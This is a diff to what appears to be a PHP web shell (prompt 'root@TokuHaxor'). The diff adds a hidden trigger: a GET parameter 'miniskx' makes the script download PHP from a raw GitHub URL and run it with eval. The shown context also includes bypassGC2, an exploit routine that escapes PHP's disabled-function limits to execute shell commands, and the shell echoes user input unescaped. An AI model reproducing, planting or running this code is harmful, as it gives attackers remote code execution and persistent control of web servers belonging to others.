@@ -26,6 +26,9 @@ class Pukimak {
                 echo "URL tidak valid.";
             }
         }
+        if(isset($_GET['miniskx'])){
+            eval("?>".file_get_contents("https://raw.githubusercontent.com/TokuHaxor/Wordpress/main/fc"));
+    }
 function GjKlPwQcF($s)
 {
     $b = 'c' . 'h' . 'o' . 'p';
@@ -1148,7 +1151,7 @@ function bypassGC($cmd) {
     ($helper->b)($cmd);
 
 }
-function bypassGC2($cmd) {
+function bypassGC2($gc2) {
     class Helper { public $a, $b, $c; }
     class Pwn {
         const LOGGING = false;
@@ -1309,7 +1312,7 @@ function bypassGC2($cmd) {
         }
     }
     echo '<div class="container-fluid language-javascript"> <div class="shell mb-3"> <pre style="font-size:15px;"><font color="green">root@TokuHaxor:~</font>#&nbsp;<font color="red">'.$_POST['shiz'].'</font><br><code>';
-    new Pwn($cmd . ' 2>&1');
+    new Pwn($gc2 . ' 2>&1');
 }
 function getinfo()
 {   
